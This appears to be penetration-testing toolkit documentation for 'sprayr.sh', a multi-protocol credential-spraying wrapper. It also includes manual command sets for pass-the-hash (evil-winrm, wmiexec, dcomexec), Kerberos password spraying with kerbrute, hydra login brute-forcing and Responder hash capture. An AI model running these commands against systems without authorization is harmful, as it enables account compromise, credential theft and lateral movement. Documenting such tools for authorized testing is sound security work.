---
tags:
  - phase/post-exploitation
  - phase/lateral-movement
  - tool/sprayr
  - tool/netexec
  - type/tool-docs
---

# sprayr.sh

## What It Is
Multi-protocol credential spray wrapper. Given a cracked or obtained credential, tests it against every relevant service on one or more targets in parallel. Prints hits immediately, records admin-level access (`Pwn3d!`) separately, and generates fully resolved copy-paste next-step commands for each hit.

**Authentication testing only — no command execution.**

> [!important] **the engagement default loop:** After ANY successful crack → `./sprayr.sh --from-creds`. After spray → read `next_steps.txt` for pre-built follow-on commands. This is the credential loop.

> [!warning] Lockout risk — read before running
> Domain sprays with a user file can trigger lockouts. Always check the lockout policy first with `adr.sh --quick`. Use `--safe` when spraying domain accounts.

---

## Quick Reference

```bash
# ★ Re-spray ALL creds after any crack (the engagement default — one command covers everything)
./sprayr.sh --from-creds

# Validate a cracked password against all protocols
./sprayr.sh -u administrator -p 'Password123!' -t 192.168.1.10

# Pass-the-hash validation (SMB/WinRM/RDP/LDAP/MSSQL only — SSH/FTP auto-skipped)
./sprayr.sh -u administrator -H fc525c9683e8fe067095ba2ddc971889 -t 192.168.1.10

# Domain spray — check lockout policy first! Always --safe with user files
./sprayr.sh -U users.txt -p 'Welcome1' -d corp.local -t 192.168.1.0/24 --safe

# Fast SMB-only validation
./sprayr.sh -u admin -p 'Pass' -t 192.168.1.10 --quick

# Local auth (not domain)
./sprayr.sh -u admin -p 'Pass' -t 192.168.1.10 --local-auth --quick

# Specific protocols only
./sprayr.sh -u admin -p 'Pass' -t 192.168.1.10 --proto smb,winrm,ldap
```

---

## Usage

```bash
./sprayr.sh -u USER     -p PASS  -t TARGET [OPTIONS]
./sprayr.sh -U users.txt -p PASS  -t TARGET [OPTIONS]
./sprayr.sh -u USER     -H HASH  -t TARGET [OPTIONS]
```

---

## Options

**Authentication:**

| Flag | Description |
|------|-------------|
| `-u, --user USER` | Single username |
| `-U, --user-file FILE` | File with usernames (one per line) |
| `-p, --password PASS` | Plaintext password |
| `-H, --hash HASH` | NTLM hash — NT-only, `:NTHASH`, or `LMHASH:NTHASH` |
| `-d, --domain DOMAIN` | Domain name for domain auth |
| `--local-auth` | Local authentication (mutually exclusive with `-d`) |
| `-k, --kerberos` | Use Kerberos ccache from `$KRB5CCNAME` (skips `-u`/`-p`/`-H` auth path) |

**Targets:**

| Flag | Description |
|------|-------------|
| `-t, --targets` | Comma-separated IPs or CIDR (e.g. `192.168.1.10` or `192.168.1.0/24`) |
| `-T, --target-file FILE` | File with targets (one per line, `#` comments ok) |

**Spray options:**

| Flag | Default | Description |
|------|---------|-------------|
| `--proto LIST` | all | Comma-separated: `smb,winrm,ssh,rdp,ldap,mssql,ftp` |
| `--quick` | off | SMB only — fastest credential check |
| `--safe` | off | Sequential (not parallel) + 2s jitter between attempts |
| `--threads N` | 20 (1-200) | nxc thread count |
| `--timeout N` | 30 (1-3600) | Per-protocol timeout in seconds |
| `--outdir DIR` | `$TOOLKIT_ROOT/spray/<timestamp>/` | Output directory |
| `--from-creds` | off | Spray all creds from `$TOOLKIT_ROOT/creds.txt` against all recon targets |
| `--no-color` | off | Disable ANSI colors (also: `export NO_COLOR=1`) |

When launched through `sudo`, the default `$TOOLKIT_ROOT` resolves to the invoking
user's home directory instead of `/root/toolkit`.

---

## Protocols

| Protocol | Port | Hash Auth | Notes |
|----------|------|-----------|-------|
| `smb` | 445 | ✅ | `Pwn3d!` = local admin; most common first check |
| `winrm` | 5985 | ✅ | `Pwn3d!` = can PSRemote; use evil-winrm |
| `rdp` | 3389 | ✅ (PtH) | Valid cred = GUI access via xfreerdp3 |
| `ldap` | 389 | ✅ | Valid = domain cred confirmed → run adr.sh |
| `mssql` | 1433 | ✅ | Valid = database access |
| `ssh` | 22 | ❌ | Hash auth auto-skipped — password only |
| `ftp` | 21 | ❌ | Hash auth auto-skipped — password only |

> [!note] For CIDR/range targets, port pre-checking is skipped — nxc handles unreachable hosts itself. For single IPs, each target's port is probed first to avoid noise.

---

## Safe Mode vs. Parallel Mode

> [!tip] **Simple rule:** Domain spray with a user file → always `--safe`. Single-cred validation → default (parallel) is fine.

**Default (parallel):** All protocols sprayed simultaneously. Fastest. Fine for single-target validation.
**`--safe`:** Sequential with 2s jitter between attempts. Use for domain account sprays with user lists to reduce lockout risk.

---

## Output Structure

```
$TOOLKIT_ROOT/spray/<timestamp>/
├── summary.txt          # ★ Results overview — read first
├── hits.txt             # All valid credentials (pipe-delimited)
├── pwnd.txt             # Admin-level hits only (Pwn3d!)
├── next_steps.txt       # Fully resolved copy-paste follow-on commands
└── raw/
    ├── smb_spray.txt    # Raw nxc output per protocol
    ├── winrm_spray.txt
    └── ...
```

**hits.txt format:** `proto|target|cred|HIT` or `proto|target|cred|PWND`

Both `hits.txt` and `pwnd.txt` are written atomically — they survive Ctrl+C with partial results intact.

> [!note] Hits auto-logged to `$TOOLKIT_ROOT/creds.txt`
> Every valid credential found is automatically appended to the shared creds ledger. `--from-creds` reads this file to feed back into future sprays.

---

## What Gets Generated in `next_steps.txt`

Script auto-generates fully resolved follow-on commands based on what was found:

| Finding | Commands Generated |
|---------|--------------------|
| SMB `Pwn3d!` (pass) | `impacket-psexec`, `impacket-wmiexec`, `impacket-smbexec`, `--sam` dump, `impacket-secretsdump`, `./adr.sh` (if domain), `nxc smb --put-file lootr.ps1` + exec |
| SMB `Pwn3d!` (hash) | Same as above with `-H :NTHASH` variants |
| SMB hit without `Pwn3d!` | Share, user, and group enumeration with the valid credential |
| WinRM `Pwn3d!` | `evil-winrm` connect, `upload lootr.ps1`, `powershell lootr.ps1`, `download attack_commands.txt` |
| WinRM hit without `Pwn3d!` | `evil-winrm` and `nxc winrm -x whoami` validation |
| SSH hit | `ssh USER@TARGET`, `./escalatr.sh TARGET --os linux`, `scp`/`ssh` to run `lootr.sh` |
| RDP hit | `xfreerdp3` with correct `/pth:` or `/p:` and `/d:` flags |
| MSSQL hit | `nxc mssql ... -q 'SELECT @@version'` |
| LDAP hit | `./adr.sh -d DOMAIN -u USER [-p PASS \| -H :HASH] -dc TARGET` |
| FTP hit | FTP login, `lftp`, and recursive `wget` commands |

All commands are pre-filled with the actual credentials, hashes, IPs, and domain from the spray.

> [!tip] **After SMB `Pwn3d!`:** `next_steps.txt` includes a `nxc smb --put-file` + exec block to drop and run `lootr.ps1` on the target, automatically generating `attack_commands.txt` for Windows privesc paths.
> **After WinRM `Pwnd`:** `next_steps.txt` includes the full evil-winrm session sequence through `download attack_commands.txt`.
> **After SSH hit:** `next_steps.txt` includes `./escalatr.sh` for automated Linux privesc enum + `lootr.sh` drop.

---

## Hash Auth Notes

Accepts three formats — all normalized internally to both NT-only and `LM:NT` for different tool requirements:

```bash
-H fc525c9683e8fe067095ba2ddc971889          # plain NT hash
-H :fc525c9683e8fe067095ba2ddc971889         # :NTHASH
-H aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889  # LM:NTHASH
```

SSH and FTP do not support NTLM hash auth — auto-skipped with a warning when using `-H`.

---

## Common Workflows

### ★ Re-spray all known creds (the engagement default)
```bash
# against every host found in recon. One command covers the whole network.
./sprayr.sh --from-creds

# Then immediately:
cat $TOOLKIT_ROOT/spray/respray_<ts>_<user>/next_steps.txt    # pre-built follow-on commands
cat $TOOLKIT_ROOT/spray/respray_<ts>_<user>/pwnd.txt           # admin-level hits
```

### Validate a cracked hash immediately
```bash
# After crackr.sh cracks a hash
./sprayr.sh -u administrator -H <NTHASH> -t 192.168.1.10 --quick

# If Pwn3d! → check next_steps.txt for psexec/secretsdump commands
```

### Post-AD enumeration spray
```bash
# Check password policy first:
cat $TOOLKIT_ROOT/ad/corp.local/password_policy.txt | grep -i lockout

# Then spray — use --safe for domain accounts
./sprayr.sh -U $TOOLKIT_ROOT/ad/corp.local/users/all_users.txt \
  -p 'Summer2024!' -d corp.local \
  -t 10.10.10.5 --safe
```

### Pass-the-Hash lateral movement validation
```bash
# Test a cracked NT hash across all machines
./sprayr.sh -u administrator -H <NTHASH> \
  -t 192.168.1.0/24 --quick
# Pwn3d! on multiple hosts = reused local admin hash
```

### Local admin hash reuse check
```bash
# After secretsdump gives you a local admin hash
./sprayr.sh -u administrator -H <NTHASH> \
  -t 192.168.1.0/24 --local-auth --quick
```

---

## Troubleshooting

```bash
# Sanity check manually:
nxc smb 192.168.1.10 -u admin -p 'Password1' --local-auth

# → spray ONE password at a time (this script sprays one cred per run by design)
```

---

---

## When the Spray Finds Nothing — Manual Auth Testing

> [!important] sprayr.sh covers SMB, WinRM, and SSH. These are the protocols and techniques it doesn't automate. Use these when you have valid credentials but can't get a shell, or when you need to test services the script doesn't reach.

---

### Valid Creds but No Pwn3d! — Try Every Service

When spray returns valid auth but no admin, the creds may only work on a specific service:

```bash
# RDP — doesn't need admin on most configurations
xfreerdp /u:user /p:'pass' /d:domain /v:IP /cert-ignore +clipboard
# MSSQL — if port 1433 open
nxc mssql IP -u user -p pass
impacket-mssqlclient domain/user:pass@IP -windows-auth
# FTP — if port 21 open
ftp IP   # enter credentials at prompt

# MySQL — if port 3306 open
mysql -h IP -u user -p

# POP3/IMAP — if ports 110/143/993/995 open
nc -nv IP 110
USER user
PASS pass
LIST           # list emails — may contain credentials or hints

# SSH with certs (when password auth is disabled)
ssh -i /path/to/key user@IP
# If you have the private key from lootr output, try it directly
```

---

### Kerberos Pre-Authentication Spray (Domain Only)

When you don't know valid usernames yet or want to avoid LDAP-based lockouts:

```bash
# Enumerate valid users first (no password attempt = no lockout)
kerbrute userenum --dc DC_IP -d corp.local userlist.txt

# Then spray ONE password (check lockout policy first)
kerbrute passwordspray --dc DC_IP -d corp.local valid_users.txt 'Summer2024!'

# <season><year>, <company>@2024, <username>123
```

---

### When You Have an NTLM Hash But SMB is Blocked

```bash
# WinRM (port 5985)
evil-winrm -i IP -u user -H NTHASH

# MSSQL with hash
impacket-mssqlclient domain/user@IP -hashes :NTHASH -windows-auth

# RDP with hash (Restricted Admin mode must be enabled)
xfreerdp /u:user /pth:NTHASH /v:IP /d:domain /cert-ignore

# WMI (no service install needed, lower footprint than psexec)
impacket-wmiexec domain/user@IP -hashes :NTHASH

# DCOM
impacket-dcomexec domain/user@IP -hashes :NTHASH
```

---

### Web Application Login Brute Force

For login forms not covered by sprayr.sh:

```bash
# Identify the POST data structure first
curl -ski http://IP/login -X POST -d "user=test&pass=test" -v 2>&1 | head -30

# Format: "/path:POST_body:failure_string"
hydra -l admin -P /usr/share/wordlists/rockyou.txt IP http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid"

# With a userlist
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt IP http-post-form \
  "/login:user=^USER^&pass=^PASS^:incorrect"

# HTTPS
hydra -l admin -P /usr/share/wordlists/rockyou.txt -s 443 -S IP https-post-form \
  "/login:user=^USER^&pass=^PASS^:failed"

# Tomcat manager (common target)
hydra -L /usr/share/seclists/Usernames/tomcat-usernames.txt \
  -P /usr/share/seclists/Passwords/tomcat-passwords.txt \
  IP http-get /manager/html
```

---

### Capturing Hashes With Responder (When You Can't Spray)

When you have no working creds but you're on the same network segment:

```bash
# Start Responder to poison LLMNR/NBT-NS/MDNS and capture Net-NTLMv2 hashes
sudo responder -I tun0 -wdPv

# Cracked hash → immediately spray: ./crackr.sh -q -f ntlmv2.txt → ./sprayr.sh --from-creds
```

---

### Password Policy Enforcement — When You're Afraid to Lock Accounts

```bash
# Get lockout policy before ANY domain spraying
nxc smb DC_IP -u user -p pass --pass-pol
# Check PSO (Password Settings Object) in BloodHound or:
Get-ADFineGrainedPasswordPolicy -Filter * | Select-Object Name, LockoutThreshold, LockoutObservationWindow
```

---

## Related

- [[Toolkit_Strategy]] — the AD credential loop: `crackr -q` → `sprayr --from-creds` (§4)
- [[adr]] — run first to get users/all_users.txt and check lockout policy
- [[crackr]] — crack the hashes that sprayr.sh then validates
